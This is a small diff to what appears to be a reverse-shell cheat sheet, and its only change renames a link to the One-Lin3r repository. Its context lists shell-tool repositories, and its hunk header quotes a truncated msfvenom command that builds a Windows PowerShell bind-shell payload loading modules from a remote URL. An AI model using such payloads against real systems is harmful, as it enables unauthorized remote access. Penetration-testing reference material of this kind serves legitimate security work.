@@ -59,7 +59,7 @@ $ msfvenom -p windows/x64/powershell_bind_tcp lport=<PORT> LOAD_MODULES="http[s]
 
 - [MrPineMan: Awesome Reverse Shell](https://github.com/MrPineMan/Awesome-Reverse-Shell)
 
-- [One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
+- [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
 
 - [Powercat](https://github.com/besimorhino/powercat)
 
